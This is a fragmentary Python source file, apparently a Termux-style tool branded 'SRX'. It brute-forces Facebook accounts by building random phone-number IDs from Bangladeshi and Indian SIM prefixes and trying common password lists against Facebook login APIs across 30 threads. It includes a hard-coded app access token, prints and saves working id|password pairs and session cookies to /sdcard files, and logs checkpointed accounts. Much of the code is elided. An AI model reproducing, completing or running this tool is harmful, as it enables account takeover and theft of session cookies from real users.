...
def clr():
	...
	print(logo)
def gith():
	os.system('xdg-open https://github.com/SPY1x1FB')
def me():
	os.system('xdg-open https://wa.me/+8801615161056')
def wpg():
	os.system('xdg-open https://chat.whatsapp.com/HUYZE8GrhiJIuREfLoT5aP')
def prnx():
...
def filex():
	...
	if me in ["1", "01","11","A","a"]:
		...
		with ThreadPool(max_workers=30) as crack_submit:
			...
			print(f'   {B}|{G}★{B}|{W} Ids Saved id {R}:{G} SRX Folder')
			lin()
			for user in fo:
...
def bd():
	...
	clr()
	lin()
	print(f'   {B}|{G}★{B}|{W} SIM CODE EXAMPLE : 017, 018, 019')
	lin()
	kode = input(f'   {B}|{G}★{B}|{W} SIM CODE : ')
	clr()
	lin()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r   {B}|{G}M1{B}|{W}[{G}SRX-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
            sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m   [SRX-CP] '+ids+'|'+pas+'\033[1;97m')
                                        open(f'/sdcard/SRX-FILE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def rndmpi():
		...
		with ThreadPool(max_workers=30) as SPYC:	
			...
			print(f'   {B}|{G}★{B}|{W} ID Saved in {R}:{G} SRX FILEs')
			lin()
			for psx in user:
				ids = '+91'+code+psx
				if plst in ['1','01']:
					passlist = [code+psx,'57273200']
				elif plst in ['2','02']:
					passlist = [code+psx,psx,'57273200','57575751','59039200']
				else:
					passlist = [code+psx,psx,'57273200','59039200','57575751','57575752','5903900','india123',code[2:]+psx,code+psx[:2],code+psx[:4]]
				if mthd in ['1','01']:
...
def rnapi1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m   [SRX API] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SRX-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/SRX-API-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/SRX-UA.txt','a').write(ua+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[38;5;205m [SRX-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SRX-API-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm1(ids, passlist, tl):
    try:
        global oks, twf, loop
        sys.stdout.write(f"\r\033[1;97m   [SRX API-2] \033[1;97m%s\033[1;97m|\033[1;92mOK:-%s\033[1;97m" % (loop, len(oks)))
        sys.stdout.flush()
        ...
        for ps in passlist:
            ...
            if 'session_key' in q:
                if "yes" in scoki:
                    ...
                    cokis = f"sb={cok};{coki}"
                    print('\r\033[1;92m [SRX-OK] ' + udx + ' | ' + ps + '\n\033[0;97m')
                    print('\r\033[1;92m [COOKIE-ID] \033[1;97m ' + cokis + '\n\033[1;97m')
                    open('/sdcard/SRX-OK.txt', 'a').write(udx + '|' + ps + '|' + cokis + '\n')
                    oks.append(ids)
                else:
                    udx = str(q['uid'])
                    print('\r\033[1;92m [SRX-OK] ' + udx + ' | ' + ps + '\033[0;97m')
                    open('/sdcard/SRX-OK.txt', 'a').write(udx + '|' + ps + '\n')
                    oks.append(ids)
            else:
                continue
...
def rndmx(ids,passlist):
        global loop,ok
        sys.stdout.write('\r\r\033[1;37m   [SRX API-X] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        ...
                        if 'session_key' in po:
                                ...
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r{G}   {G}[SRX-OK] {str(uid)} | {pas} ')
                                ...
                                try:
                                    ...
                                    uid = ids
                                print(f'\r{R}   [SRX-CP] {str(uid)} | {pas} ')
                                open('/sdcard/SRX-API-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
